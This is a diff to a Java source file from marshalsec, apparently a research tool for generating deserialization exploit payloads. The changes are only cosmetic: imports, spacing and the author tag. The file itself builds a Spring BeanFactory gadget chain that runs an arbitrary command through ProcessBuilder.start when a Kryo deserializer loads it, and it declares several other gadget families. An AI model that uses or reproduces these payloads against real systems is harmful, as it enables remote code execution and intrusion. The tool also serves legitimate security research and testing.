@@ -23,28 +23,15 @@ SOFTWARE.
 package marshalsec;
 
 
+import marshalsec.gadgets.*;
 import org.objenesis.strategy.StdInstantiatorStrategy;
-
-import marshalsec.gadgets.Args;
-import marshalsec.gadgets.BindingEnumeration;
-import marshalsec.gadgets.Groovy;
-import marshalsec.gadgets.ImageIO;
-import marshalsec.gadgets.LazySearchEnumeration;
-import marshalsec.gadgets.Resin;
-import marshalsec.gadgets.Rome;
-import marshalsec.gadgets.ServiceLoader;
-import marshalsec.gadgets.SpringPartiallyComparableAdvisorHolder;
-import marshalsec.gadgets.SpringUtil;
-import marshalsec.gadgets.XBean;
 
 
 /**
- * 
  * Not applicable:
  * - ImageIO: cannot restore method
- * 
- * @author mbechler
  *
+ * @author mbechler
  */
 public class KryoAltStrategy extends Kryo implements Rome, SpringPartiallyComparableAdvisorHolder, Groovy, Resin, LazySearchEnumeration,
         BindingEnumeration, ServiceLoader, ImageIO, XBean {
@@ -55,7 +42,7 @@ public class KryoAltStrategy extends Kryo implements Rome, SpringPartiallyCompar
      * @see marshalsec.Kryo#makeKryo()
      */
     @Override
-    protected com.esotericsoftware.kryo.Kryo makeKryo () {
+    protected com.esotericsoftware.kryo.Kryo makeKryo() {
         com.esotericsoftware.kryo.Kryo k = super.makeKryo();
         k.setInstantiatorStrategy(new com.esotericsoftware.kryo.Kryo.DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));
         return k;
@@ -65,19 +52,19 @@ public class KryoAltStrategy extends Kryo implements Rome, SpringPartiallyCompar
     /**
      * Example with default bean factory method trigger instead, alt strategy required for ProcessBuilder
      */
-    @Args ( minArgs = 1, args = {
-        "cmd", "args..."
+    @Args(minArgs = 1, args = {
+            "cmd", "args..."
     }, defaultArgs = {
-        MarshallerBase.defaultExecutable
-    } )
+            MarshallerBase.defaultExecutable
+    })
     @Override
-    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
+    public Object makeBeanFactoryPointcutAdvisor(UtilFactory uf, String[] args) throws Exception {
         return SpringUtil
                 .makeBeanFactoryTriggerBFPA(uf, "caller", SpringUtil.makeMethodTrigger(new ProcessBuilder(args), "start"));
     }
 
 
-    public static void main ( String[] args ) {
+    public static void main(String[] args) {
         new KryoAltStrategy().run(args);
     }
 }
